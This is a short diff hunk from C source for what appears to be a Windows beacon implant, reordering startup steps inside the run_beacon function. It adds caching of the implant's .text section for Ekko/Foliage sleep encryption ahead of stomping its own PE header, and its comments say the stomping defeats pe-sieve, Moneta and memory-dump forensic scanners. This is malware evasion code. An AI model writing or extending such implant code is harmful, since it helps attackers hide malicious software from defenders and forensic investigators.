@@ -555,7 +555,16 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
     (void)unused;
 
     /*
-     * FIRST: stomp our own PE header before any network or evasion calls.
+     * FIRST: cache our .text section location for Ekko/Foliage sleep.
+     * We must do this before PE Stomping because stomp_pe_header destroys
+     * the section table that get_own_text_section relies on.
+     */
+#if ENABLE_SLEEP_ENCRYPT
+    get_own_text_section();
+#endif
+
+    /*
+     * NEXT: stomp our own PE header before any network or evasion calls.
      * Windows has already mapped all sections -- header is now dead weight.
      * This defeats pe-sieve, Moneta, and memory-dump forensic scanners.
      */
